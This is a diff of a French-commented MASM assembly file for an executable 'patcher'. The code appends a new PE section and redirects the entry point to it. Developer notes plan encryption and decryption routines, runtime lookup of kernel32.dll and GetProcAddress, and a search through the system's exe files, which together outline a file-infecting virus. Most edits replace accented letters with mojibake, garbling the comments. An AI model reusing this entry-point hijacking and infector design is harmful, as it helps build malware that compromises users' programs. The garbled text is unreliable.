@@ -232,8 +232,8 @@ AjoutSection proc uses esi edi
     
     movzx eax, [edi].FileHeader.NumberOfSections    ;c'est la proc qui indique au loader
     mov NumberOfSections, eax                       ;que ta section existe
-    inc NumberOfSections                            ;mais ça n'ajoute pas à proprement parler
-    mov eax, NumberOfSections                       ;ta section,pour ça il faut son adresse
+    inc NumberOfSections                            ;mais Ã§a n'ajoute pas Ã  proprement parler
+    mov eax, NumberOfSections                       ;ta section,pour Ã§a il faut son adresse
     mov [edi].FileHeader.NumberOfSections, ax       ;et la remplir avec ton code.
     
     mov eax, [edi].OptionalHeader.SectionAlignment
@@ -269,14 +269,14 @@ AjoutSection proc uses esi edi
 
     add edi, sizeof IMAGE_SECTION_HEADER
 
-    mov eax, VirtualAddress                	  ;ici on va chercher l'adresse à laquelle doit             
+    mov eax, VirtualAddress                	  ;ici on va chercher l'adresse Ã  laquelle doit             
     mov ebx, VirtualSize               	 	  ;commencer la section qu'on ajoute
-    add ebx, eax                       	    	  ;elle se trouve juste après la dernière section
+    add ebx, eax                       	    	  ;elle se trouve juste aprÃ¨s la derniÃ¨re section
     .WHILE eax<ebx                          
         add eax, SectionAlignment
     .ENDW
     mov [edi].VirtualAddress, eax
-    mov VirtualAddress, eax                 	  ;voilà l'adresse de notre section (en mémoire!)
+    mov VirtualAddress, eax                 	  ;voilÃ  l'adresse de notre section (en mÃ©moire!)
 
     mov eax, PointerToRawData
     mov ebx, SizeOfRawData
@@ -285,7 +285,7 @@ AjoutSection proc uses esi edi
         add eax, FileAlignment
     .ENDW
     mov [edi].PointerToRawData, eax
-    mov PointerToRawData, eax                     ;voilà l'adresse de notre section (en dur!)
+    mov PointerToRawData, eax                     ;voilÃ  l'adresse de notre section (en dur!)
 
     mov edx, 1000h                                
 
@@ -311,7 +311,7 @@ AjoutSection proc uses esi edi
     invoke CloseHandle, pMapping
     
     mov eax, PointerToRawData
-    add eax, SizeOfRawData                      ;eax=la taille du fichier avec notre code ajouté
+    add eax, SizeOfRawData                      ;eax=la taille du fichier avec notre code ajoutÃ©
     
     invoke CreateFileMapping, hMapping, NULL, PAGE_READWRITE, 0, eax, 0
     mov pMapping, eax
@@ -356,7 +356,7 @@ AjoutSection proc uses esi edi
     add edi, [edi].e_lfanew
     assume edi:ptr IMAGE_NT_HEADERS
     mov eax, VirtualAddress
-    mov [edi].OptionalHeader.AddressOfEntryPoint, eax        ;EntryPoint modifié, pointe maintenant sur le début 
+    mov [edi].OptionalHeader.AddressOfEntryPoint, eax        ;EntryPoint modifiÃ©, pointe maintenant sur le dÃ©but 
                                                             ;de la nouvelle section
     push eax                                                
 
@@ -409,13 +409,13 @@ RVAToOffset proc uses edi esi edx ecx pFileMap:DWORD, RVA:DWORD ;pMapping2
     movzx ecx, cx
     assume edx:ptr IMAGE_SECTION_HEADER
     .WHILE ecx>0                                                ;tant qu'il y a une section...
-        .IF edi>=[edx].VirtualAddress                            ;si la RVA est plus loin que le début de la section..
+        .IF edi>=[edx].VirtualAddress                            ;si la RVA est plus loin que le dÃ©but de la section..
             mov eax, [edx].VirtualAddress
             add eax, [edx].SizeOfRawData                        ;et si elle est moins loin que la fin de la section..
             .IF edi<eax
                 mov eax, [edx].VirtualAddress
-                sub edi, eax                                    ;il ne reste que le décalage
-                mov eax, [edx].PointerToRawData                 ;qu'on ajoute au début du RawData (data en dur)
+                sub edi, eax                                    ;il ne reste que le dÃ©calage
+                mov eax, [edx].PointerToRawData                 ;qu'on ajoute au dÃ©but du RawData (data en dur)
                 add eax, edi                                    ;et on obtient l'offset dans le fichier
 
                 ret
@@ -505,21 +505,15 @@ ptest endp
 
 end start
 
-; Algorithme en pseudo-code pour le fichier texte
-
-; 1/ Le bombyx capture sa proie et pond dedans.
-; 2/ Il pond une nouvelle section.
-; 3/ Il ecrit dedans les instructions: récupérer kernel32.dll et les fonctions nécessaires pour
-; la suite, ouvrir fichier texte (nom arbitraire), lire et copier
-; le contenu du fichier dans la mémoire du process courant, jumper dessus.
+; Pseudo-code 
 
 ; On va avoir besoin des API suivantes:
-;	- Les API pour récupérer l'ImageBase de kernel32.dll et les adresses des fonctions utiles
+;	- Les API pour rÃ©cupÃ©rer l'ImageBase de kernel32.dll et les adresses des fonctions utiles
 ;	- CreateFile (pour ouvrir le fichier texte)
-;	- ReadFile (qui lit ET écrit le contenu du fichier texte)
-;	- WriteProcessMemory (qui écrit dans la mémoire du process courant)
+;	- ReadFile (qui lit ET Ã©crit le contenu du fichier texte)
+;	- WriteProcessMemory (qui Ã©crit dans la mÃ©moire du process courant)
 
-; Voilà les prototypes:
+; VoilÃ  les prototypes:
 
 ;		HANDLE CreateFile(
 
@@ -544,60 +538,54 @@ end start
 ; CreateFile et ReadFile sont simples tant qu'il s'agit de lire un bloc, sinon il faudra aussi
 ; SetFilePointer qui casse bien les couilles.
 ; Pour l'instant, c'est du pseudo-code donc on fait au plus simple.
-; Les fonctions de récupération de kernel32.dll seront vues ailleurs.
+; Les fonctions de rÃ©cupÃ©ration de kernel32.dll seront vues ailleurs.
 
 ; Il faut stocker qqpart le nom du fichier: FileName et le handle du process, hProc
 
 ;		invoke CreateFile,addr FileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL
-;		invoke ReadFile,eax,[offset où on met le texte],[nombre de bytes à lire],[pointeur sur l'endroit où il stocke le nombre de bytes lus finalement],NULL
-;		invoke WriteProcessMemory,hProc,[adresse où écrire],[offset où on a mis le texte avec ReadFile],[nombre de bytes lus par ReadFile finalement],[pointeur sur l'endroit où il stocke le nombre de bytes écrits finalement]
+;		invoke ReadFile,eax,[offset oÃ¹ on met le texte],[nombre de bytes Ã  lire],[pointeur sur l'endroit oÃ¹ il stocke le nombre de bytes lus finalement],NULL
+;		invoke WriteProcessMemory,hProc,[adresse oÃ¹ Ã©crire],[offset oÃ¹ on a mis le texte avec ReadFile],[nombre de bytes lus par ReadFile finalement],[pointeur sur l'endroit oÃ¹ il stocke le nombre de bytes Ã©crits finalement]
 		
 ; Routine de test
-; Elle devrait copier qq octets d'un fichier texte et l'écrire dans l'exe en mémoire
+; Elle devrait copier qq octets d'un fichier texte et l'Ã©crire dans l'exe en mÃ©moire
 ; Elle st au-dessus sous le nom de ptest
 
 
 ; le 25/10 
-; problème avec le dumper: les valeurs des header sont en decimal, il faut une sortie en hexa
-; mais SetDlgItemInt ne gère pas ça. Il faut convertir avant.
+; problÃ¨me avec le dumper: les valeurs des header sont en decimal, il faut une sortie en hexa
+; mais SetDlgItemInt ne gÃ¨re pas Ã§a. Il faut convertir avant.
 ; Creation de la proc AjoutSection
 
 ;le 26/10
-; j'ai fini la proc AjoutSection et après vérification, tout fonctionne sauf la modification de
-; VirtualSize. 
-; Problème: si le patcher ajoute du code avec un fichier texte, comment restaurer l'entrypoint
-; puisque le code est déjà compilé?
+; j'ai fini la proc AjoutSection et aprÃ¨s vÃ©rification, tout fonctionne sauf la modification de VirtualSize. 
 
 ; le 27/10
-; Le patcher est presque terminé, le bug de VirtualSize est fixé, ne manquent que les procédures de Cryptage et de Fichier Texte
-; Je pense que Fravia ne connaissait pas le shit, sinon il n'aurait jamais dit que l'alcool
-; aide à coder.. La soirée "Hoggar m'a tuer" = pas de code. Il faut cesser!
-; Et il faut convertir le décimal en héxa dans le dumper!
+; Le patcher est presque terminÃ©, le bug de VirtualSize est fixÃ©, ne manquent que les procÃ©dures de Cryptage et de Fichier Texte
+; Il faut convertir le dÃ©cimal en hÃ©xa dans le dumper!
 
 ; le 28/10
-; Sofiane m'a dit qu'il fallait utiliser un algo fait main pour le décimal->héxa
-; Restent à faire:
+; Restent Ã  faire:
 ; 			- Fonction cryptage
 ;			- Remplir la nvelle section avec un fichier texte
-;			- Retrouver de la doc sur la recherche de "kernel32.dll" en mémoire, puis GetProcAdress
-;			- Mettre la routine de décryptage
+;			- Retrouver de la doc sur la recherche de "kernel32.dll" en mÃ©moire, puis GetProcAdress
+;			- Mettre la routine de dÃ©cryptage
 
-; Pour la proc de recherche des fichiers exe du système, trouver de la doc sur la transmission 
-; de structure par référence (appel invoke). Un OFFSET StructName donne 0.
-; Comment récupérer l'adresse d'une structure? Ou un pointeur?
+; Pour la proc de recherche des fichiers exe du systÃ¨me, trouver de la doc sur la transmission 
+; de structure par rÃ©fÃ©rence (appel invoke). Un OFFSET StructName donne 0.
+; Comment rÃ©cupÃ©rer l'adresse d'une structure? Ou un pointeur?
 
 ; le 29/10
-; Création de la fonction de récupération de l'adresse de GetProcAdress et donc de toutes les
-; fonctions utiles au bombyx.
+; CrÃ©ation de la fonction de rÃ©cupÃ©ration de l'adresse de GetProcAdress et donc de toutes les
+; fonctions utiles au soft.
 ; Utilisation des header: IMAGE_DIRECTORY_ENTRY_IMPORT qui contient souvent l'adresse de
 ; GetProcAddress. Par contre, il n'y a pas l'adresse de kernel32.dll. 
 
 ; le 30/10
 ; Les TabStrips fonctionnent toujours pas.
-; Il faudrait retrouver l'adresse en mémoire de kernel32.dll, et les RVA des fonctions dans 
+; Il faudrait retrouver l'adresse en mÃ©moire de kernel32.dll, et les RVA des fonctions dans 
 ; sa table d'exportation.
 
 ; le 1/11
-; Trouvé un .asm sur les tabstrips
-; Trouvé un .asm pour retrouver l'imagebase de kernel32.dll
-; Reste à coder la fonction d'ouverture/lecture du .txt et le WriteProcessMemory
+; TrouvÃ© un .asm sur les tabstrips
+; TrouvÃ© un .asm pour retrouver l'imagebase de kernel32.dll
+; Reste Ã  coder la fonction d'ouverture/lecture du .txt et le WriteProcessMemory
